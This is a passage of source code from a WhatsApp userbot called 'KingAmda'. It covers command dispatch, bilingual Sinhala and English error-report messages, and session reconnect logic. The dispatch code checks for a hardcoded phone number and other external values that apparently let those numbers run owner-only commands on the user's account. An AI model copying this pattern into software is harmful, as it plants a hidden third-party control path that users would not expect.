                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    if ((config.OWN !== false && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && config.OWN.includes(',') ? config.OWN.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.OWN || config.OWN.includes(',') ? config.OWN.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.OWN)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;  
                    }
                    if ((OWNE.ff == "94786238616,0" && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && OWNE.ff.includes(',') ? OWNE.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWNE.ff || OWNE.ff.includes(',') ? OWNE.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWNE.ff)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    if ((awsh.WA_CONNECTION !== false && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && awsh.WA_CONNECTION.includes(',') ? awsh.WA_CONNECTION.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == awsh.WA_CONNECTION || awsh.WA_CONNECTION.includes(',') ? awsh.WA_CONNECTION.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == awsh.WA_CONNECTION)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }  
                     
//=====================================================================================
//=====================================================================================
                            
                    if (sendMsg) {
                        if (config.SEND_READ && command.on === undefined) {
                            await conn.chatRead(msg.key.remoteJid);
                        }
                       
                        var match = text_msg.match(command.pattern);
                        
                        if (command.on !== undefined && (command.on === 'image' || command.on === 'photo' )
                        && msg.message.imageMessage !== null) {
                            whats = new Image(conn, msg);
                        } else if (command.on !== undefined && (command.on === 'video' )
                        && msg.message.videoMessage !== null) {
                            whats = new Video(conn, msg);
                        } else {
                            whats = new Message(conn, msg);
                        }
/*
                        if (command.deleteCommand && msg.key.fromMe) {
                            await whats.delete(); 
                        }
*/


//=====================================================================================
//=====================================================================================

                        try {
                            await command.function(whats, match);
                        } catch (error) {
                            if (config.NOLOG == 'true') return;
                            if (config.LANG == 'SI' || config.LANG == 'AZ') {
                                await conn.sendMessage(conn.user.jid, '*-- බොට් වාර්තාව [*👑 ҚɪЛƓ 卂ϻᗪ卂 👑*] --*' + 
                                    '\n*ҚɪЛƓ 卂ϻᗪ卂 නිසි ලෙස ක්‍රියා කරයි!*'+
                                    '\n_මෙය ඔබගේ LOG අංකයයි! _මෙහි විධාන භාවිතයෙන් වළකින්න_' +
                                    '\n_ඔබට පුලුවන් වෙනත් ඕනෑම කතාබහක විධාන භාවිතා කරන්න._' +
                                    '\n_වැඩි දුර උදව් සදහා සහය සමූහයට එකතු වෙන්න._' +
                                    '\n_සහය සමූහ: https://chat.whatsapp.com/Ish5h9u7qUWLt98HWAYidK_\n\n' +
                                    '*🚫ප්‍රධාන දෝෂය:* ```' + error + '```\n\n'
                                    , MessageType.text, {detectLinks: false});

                                if (error.message.includes('URL')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚜ 🧐දෝශ විශ්ලේෂනය [👑ҚɪЛƓ 卂ϻᗪ卂👑] ⚜*' + 
                                        '\n========== ``` 🧐දෝශ විශ්ලේෂනය!``` ==========' +
                                        '\n\n*🚫ප්‍රධාන දෝෂය:* _Only Absolutely URLs Supported_' +
                                        '\n*🤖හේතුව:* _LOG අංකය තුළ මාධ්‍ය මෙවලම් (nmedia, sticker..) භාවිතය._' +
                                        '\n*🥰️විසඳුම:* _LOG අංකය හැර ඕනෑම චැට් එකකදී ඔබට විධානයන් භාවිතා කළ හැකිය._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('SSL')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [👑ҚɪЛƓ 卂ϻᗪ卂👑] ⚕️*' + 
                                        '\n========== ``` 🧐දෝශ විශ්ලේෂනය!``` ==========' +
                                        '\n\n*🚫ප්‍රධාන දෝෂය:* _SQL Database Error_' +
                                        '\n*🤖හේතුව:* _Database\'දෝශයකි._ ' +
                                        '\n*🥰️විසඳුම:* _නිශ්චිත විසදුමක් නොමැත..ඔබට හැකියි නැවත යෙදුම්ගත කිරීමට._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('split')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [👑ҚɪЛƓ 卂ϻᗪ卂👑] ⚕️*' + 
                                        '\n========== ``` 🧐දෝශ විශ්ලේෂනය.!``` ==========' +
                                        '\n\n*🚫ප්‍රධාන දෝෂය:* _Split of Undefined_' +
                                        '\n*🤖හේතුව:* _කණ්ඩායම් admin භාවිතා කළ හැකි විධානයන් සමහර විට split ක්‍රියාවලිය නොදකි._ ' +
                                        '\n*🥰️විසඳුම:* _Restart කිරීම ප්‍රමාණවත් වේ._'
                                        , MessageType.text
                                    );                               
                                }
                                else if (error.message.includes('Ookla')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [👑ҚɪЛƓ 卂ϻᗪ卂👑] ⚕️*' + 
                                        '\n========== ``` 🧐දෝශ විශ්ලේෂනය!``` ==========' +
                                        '\n\n*🚫ප්‍රධාන දෝෂය:* _Ookla Server Connection_' +
                                        '\n*🤖හේතුව:* _සේවාදායකයට වේගවත්ම දත්ත සම්ප්‍රේෂණය කළ නොහැක._' +
                                        '\n*🥰️විසඳුම:* _ඔබ එය තවත් වරක් භාවිතා කළහොත් ගැටළුව විසඳනු ඇත.._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('params')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [👑ҚɪЛƓ 卂ϻᗪ卂👑] ⚕️*' + 
                                        '\n========== ``` 🧐දෝශ විශ්ලේෂනය!``` ==========' +
                                        '\n\n*🚫ප්‍රධාන දෝෂය:* _Requested Audio Params_' +
                                        '\n*🤖හේතුව:* _හෝඩියේ පිටත TTS විධානය භාවිතා කිරීම._' +
                                        '\n*🥰️විසඳුම:* _ඔබ අකුරු රාමුව තුළ ඇති විධානය භාවිතා කළහොත් ගැටළුව විසඳනු ඇත._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unlink')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [👑ҚɪЛƓ 卂ϻᗪ卂👑] ⚕️*' + 
                                        '\n========== ``` 🧐දෝශ විශ්ලේෂනය!``` ==========' +
                                        '\n\n*🚫ප්‍රධාන දෝෂය:* _No Such File or Directory_' +
                                        '\n*🤖හේතුව:* _Pluginයේ වැරදි කේතීකරණය._' +
                                        '\n*🥰️විසඳුම:* _කරුණාකර ඔබේ plugin කේත පරීක්‍ෂා කරන්න._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('404')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [👑ҚɪЛƓ 卂ϻᗪ卂👑] ⚕️*' + 
                                        '\n========== ``` 🧐දෝශ විශ්ලේෂනය!``` ==========' +
                                        '\n\n*🚫ප්‍රධාන දෝෂය:* _Error 404 HTTPS_' +
                                        '\n*🤖හේතුව:* _Heroku plugins යටතේ ඇති විධානයන් භාවිතා කිරීම හේතුවෙන් සේවාදායකයා සමඟ සන්නිවේදනය කිරීමට නොහැකි වීම._' +
                                        '\n*🥰️විසඳුම:* _ටික වේලාවක් බලා නැවත උත්සාහ කරන්න. ඔබ තවමත් දෝෂයක් ලබා ගන්නේ නම්, වෙබ් අඩවිය මඟින් යලි ආරම්භ කිරීම සිදු කරන්න._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('reply.delete')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [👑ҚɪЛƓ 卂ϻᗪ卂👑] ⚕️*' + 
                                        '\n========== ``` 🧐දෝශ විශ්ලේෂනය!``` ==========' +
                                        '\n\n*🚫ප්‍රධාන දෝෂය:* _Reply Delete Function_' +
                                        '\n*🤖හේතුව:* _IMG හෝ Wiki විධානයන් භාවිතා කිරීම. (Official වට්ස්ඇප් භාවිතය.)_' +
                                        '\n*🥰️විසඳුම:* _මෙම දෝෂය සඳහා විසඳුමක් නොමැත. එය fatal error නොවේ._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('load.delete')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [👑ҚɪЛƓ 卂ϻᗪ卂👑] ⚕️*' + 
                                        '\n========== ``` 🧐දෝශ විශ්ලේෂනය!``` ==========' +
                                        '\n\n*🚫ප්‍රධාන දෝෂය:* _Reply Delete Function_' +
                                        '\n*🤖හේතුව:* _IMG හෝ Wiki විධානයන් භාවිතා කිරීම. (Official වට්ස්ඇප් භාවිතය.)_' +
                                        '\n*🥰️විසඳුම:* _මෙම දෝෂය සඳහා විසඳුමක් නොමැත. එය fatal error නොවේ.'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('400')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [👑ҚɪЛƓ 卂ϻᗪ卂👑] ⚕️*' + 
                                        '\n========== ``` 🧐දෝශ විශ්ලේෂනය!``` ==========' +
                                        '\n\n*🚫ප්‍රධාන දෝෂය:* _Bailyes Action Error_ ' +
                                        '\n*🤖හේතුව:* _නිශ්චිත හේතුව නොදනී. විකල්ප එකකට වඩා මෙම දෝෂය ඇති වීමට හේතු විය හැක._' +
                                        '\n*🥰️විසඳුම:* _ඔබ එය නැවත භාවිතා කළහොත් එය වැඩිදියුණු විය හැකිය. දෝෂය දිගටම පැවතුනහොත්, ඔබට restart කිරීමට උත්සාහ කළ හැකිය._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('decode')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [👑ҚɪЛƓ 卂ϻᗪ卂👑] ⚕️*' + 
                                        '\n========== ``` 🧐දෝශ විශ්ලේෂනය!``` ==========' +
                                        '\n\n*🚫ප්‍රධාන දෝෂය:* _Cannot Decode Text or Media_' +
                                        '\n*🤖හේතුව:* _වැරදි ලෙස භාවිතා කිරීම._' +
                                        '\n*🥰️විසඳුම:* _විධාන ලැයිස්තුවෙ විස්තර ලියා ඇති පරිදි කරුණාකර විධානයන් භාවිතා කරන්න._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unescaped')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [👑ҚɪЛƓ 卂ϻᗪ卂👑] ⚕️*' + 
                                        '\n========== ``` 🧐දෝශ විශ්ලේෂනය!``` ==========' +
                                        '\n\n*🚫ප්‍රධාන දෝෂය:* _Word Character Usage_' +
                                        '\n*🤖හේතුව:* _English හෝඩියේ පිටත TTP, ATTP වැනි විධානයන් භාවිතා කිරීම._' +
                                        '\n*🥰️විසඳුම:* _ඔබ English හෝඩියේ විධානය භාවිතා කළහොත් ගැටළුව විසඳනු ඇත._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('conversation')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [👑ҚɪЛƓ 卂ϻᗪ卂👑] ⚕️*' + 
                                        '\n========== ``` 🧐දෝශ විශ්ලේෂනය!``` ==========' +
                                        '\n\n*🚫ප්‍රධාන දෝෂය:* _Deleting Plugin_' +
                                        '\n*🤖හේතුව:* ප්ලගීනයෙ නම වැරදියි.._' +
                                        '\n*🥰️විසඳුම:* _ප්ලගීනයෙ නමට ඉදිරියෙන් මෙය හොදන්න_ *__* _නැතහොත් නමෙ අගට_ ```?(.*) / $``` _මේවා යොදන්න._'
                                        , MessageType.text
                                    );
                                }
                                else {
                                    return await conn.sendMessage(conn.user.jid, '*😕 කණගාටුයි AUTO ERROR පද්ධතියට හදුනාගත නොහැකියි!*' +
                                        '\n_ඔබට පුලුවන් වැඩිදුර උදව් සදහා සහය සමූහයට ලිවීමට..🛡️ https://chat.whatsapp.com/Ish5h9u7qUWLt98HWAYidK_'
                                        , MessageType.text
                                    );
                                }
                            }
                            else {
                                await conn.sendMessage(conn.user.jid, '*-- Bot Report [ ' + awsh.DEVELOPER_TAG +' ] --*' + 
                                    '\n* ' + awsh.DEVELOPER_TAG +'  Working Perfectly!*'+
                                    '\n_This is Your LOG Number Dont try Command here.!_' +
                                    '\n_Also you can Join our Support group.._' +
                                    '\n_Support groups_: https://chat.whatsapp.com/Ish5h9u7qUWLt98HWAYidK_' +
                                    '\n_(saved Messages)._\n\n' +
                                    '*Error:* ```' + error + '```\n\n'
                                    , MessageType.text, {detectLinks: false}
                                );
                                if (error.message.includes('URL')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [ ' + awsh.DEVELOPER_TAG +' ] ⚕️*' + 
                                        '\n========== ```🧐ERROR ANALYSIS!``` ==========' +
                                        '\n\n*Main Error:* _Only Absolutely URLs Supported_' +
                                        '\n*Reason:* _The usage of media tools (nmedia, sticker..) in the LOG number._' +
                                        '\n*Solution:* _You can use commands in any chat, except the LOG number._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('conversation')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [ ' + awsh.DEVELOPER_TAG +' ] ⚕️*' + 
                                        '\n========== ```🧐ERROR ANALYSIS!``` ==========' +
                                        '\n\n*Main Error:* _Deleting Plugin_' +
                                        '\n*Reason:* _Entering incorrectly the name of the plugin wanted to be deleted._' +
                                        '\n*Solution:* _Please try without adding_ *__* _to the plugin you want to delete. If you still get an error, try to add like_ ```?(.*) / $``` _to the end of the name._ '
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('split')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [ ' + awsh.DEVELOPER_TAG +' ] ⚕️*' + 
                                        '\n========== ```🛡️ERROR ANALYSIS!``` ==========' +
                                        '\n\n*Main Error:* _Split of Undefined_' +
                                        '\n*Reason:* _Commands that can be used by group admins occasionally dont see the split function._ ' +
                                        '\n*Solution:* _Restarting will be enough._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('SSL')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [ ' + awsh.DEVELOPER_TAG +' ] ⚕️*' + 
                                        '\n========== ```🧐ERROR ANALYSIS!``` ==========' +
                                        '\n\n*Main Error:* _SQL Database Error_' +
                                        '\n*Reason:* _Database corruption._ ' +
                                        '\n*Solution:* _There is no known solution. You can try reinstalling it._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('Ookla')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [ ' + awsh.DEVELOPER_TAG +' ] ⚕️*' + 
                                        '\n========== ```🧐ERROR ANALYSIS!``` ==========' +
                                        '\n\n*Main Error:* _Ookla Server Connection_' +
                                        '\n*Reason:* _Speedtest data cannot be transmitted to the server._' +
                                        '\n*Solution:* _If you use it one more time the problem will be solved._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('params')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [ ' + awsh.DEVELOPER_TAG +' ] ⚕️*' + 
                                        '\n========== ```🧐ERROR ANALYSIS!``` ==========' +
                                        '\n\n*Main Error:* _Requested Audio Params_' +
                                        '\n*Reason:* _Using the TTS command outside the Latin alphabet._' +
                                        '\n*Solution:* _The problem will be solved if you use the command in Latin letters frame._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unlink')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [ ' + awsh.DEVELOPER_TAG +' ] ⚕️*' + 
                                        '\n========== ```🧐ERROR ANALYSIS``` ==========' +
                                        '\n\n*Main Error:* _No Such File or Directory_' +
                                        '\n*Reason:* _Incorrect coding of the plugin._' +
                                        '\n*Solution:* _Please check the your plugin codes._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('404')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [ ' + awsh.DEVELOPER_TAG +' ] ⚕️*' + 
                                        '\n========== ```🧐ERROR ANALYSIS!``` ==========' +
                                        '\n\n*Main Error:* _Error 404 HTTPS_' +
                                        '\n*Reason:* _Failure to communicate with the server as a result of using the commands under the Heroku plugin._' +
                                        '\n*Solution:* _Wait a while and try again. If you still get the error, perform the transaction on the website.._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('reply.delete')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [ ' + awsh.DEVELOPER_TAG +' ] ⚕️*' + 
                                        '\n========== ```🛡️ERROR ANALYSIS!``` ==========' +
                                        '\n\n*Main Error:* _Reply Delete Function_' +
                                        '\n*Reason:* _Using IMG or Wiki commands._' +
                                        '\n*Solution:* _There is no solution for this error. It is not a fatal error._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('load.delete')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [ ' + awsh.DEVELOPER_TAG +' ] ⚕️*' + 
                                        '\n========== ```🧐ERROR ANALYSIS!``` ==========' +
                                        '\n\n*Main Error:* _Reply Delete Function_' +
                                        '\n*Reason:* _Using IMG or Wiki commands._' +
                                        '\n*Solution:* _There is no solution for this error. It is not a fatal error._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('400')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [ ' + awsh.DEVELOPER_TAG +' ] ⚕️*' + 
                                        '\n========== ```🧐ERROR ANALYSIS!``` ==========' +
                                        '\n\n*Main Error:* _Bailyes Action Error_ ' +
                                        '\n*Reason:* _The exact reason is unknown. More than one option may have triggered this error._' +
                                        '\n*Solution:* _If you use it again, it may improve. If the error continues, you can try to restart._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('decode')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [ ' + awsh.DEVELOPER_TAG +' ] ⚕️*' + 
                                        '\n========== ```🧐ERROR ANALYSIS!``` ==========' +
                                        '\n\n*Main Error:* _Cannot Decode Text or Media_' +
                                        '\n*Reason:* _Incorrect use of the plug._' +
                                        '\n*Solution:* _Please use the commands as written in the plugin description._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unescaped')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [ ' + awsh.DEVELOPER_TAG +' ] ⚕️*' + 
                                        '\n========== ```🧐ERROR ANALYSIS!``` ==========' +
                                        '\n\n*Main Error:* _Word Character Usage_' +
                                        '\n*Reason:* _Using commands such as TTP, ATTP outside the Latin alphabet._' +
                                        '\n*Solution:* _The problem will be solved if you use the command in Latin alphabet.._'
                                        , MessageType.text
                                    );
                                }
                                else {
                                    return await conn.sendMessage(conn.user.jid, '*🧚‍♂Sorry, I Couldnt Read This Error!🙇🏻*' +
                                        '\n_You can write to our support groups for more help...🛡️ https://chat.whatsapp.com/Ish5h9u7qUWLt98HWAYidK_'
                                        , MessageType.text
                                    );
                               }
                          }
                      }
                  }
               }  
           }
        )
    });

    try {
        await conn.connect();
    } catch {
        if (!nodb) {
            console.log(chalk.red.bold('Restarting Old Session...'))
            conn.loadAuthInfo(Session.deCrypt(config.SESSION)); 
            try {
                await conn.connect();
            } catch {
                return;
            }
        }
    }
}

KingAmda();
